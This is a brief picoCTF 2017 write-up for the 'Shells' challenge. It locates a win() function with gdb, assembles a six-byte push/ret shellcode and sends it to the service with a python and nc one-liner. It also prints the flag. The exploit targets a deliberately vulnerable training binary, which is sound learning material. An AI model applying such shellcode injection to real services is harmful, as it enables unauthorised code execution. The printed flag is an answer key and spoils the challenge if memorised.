## Shells - 70

### Description

How much can a couple bytes do? Use shells! Source. Connect on shell2017.picoctf.com:40976.

### Hint

  - Read about basic shellcode
  - You don't need a full shell (yet...), just enough to get the flag

### Write up

    (gdb) disas win
    Dump of assembler code for function win:
       0x08048540 <+0>:     push   %ebp
       ...

win() is at 0x08048540.

    push 0x08048540
    ret

This will be our payload

You can asemble it in this [site](https://defuse.ca/online-x86-assembler.htm#disassembly).

    0:  68 40 85 04 08          push   0x8048540
    5:  c3                      ret

Used python to insert payload.

    $ python -c 'print "\x68\x40\x85\x04\x08\xc3"' | nc localhost 40976

> cd875b6ffb5cdd3319532d52ceca71aa
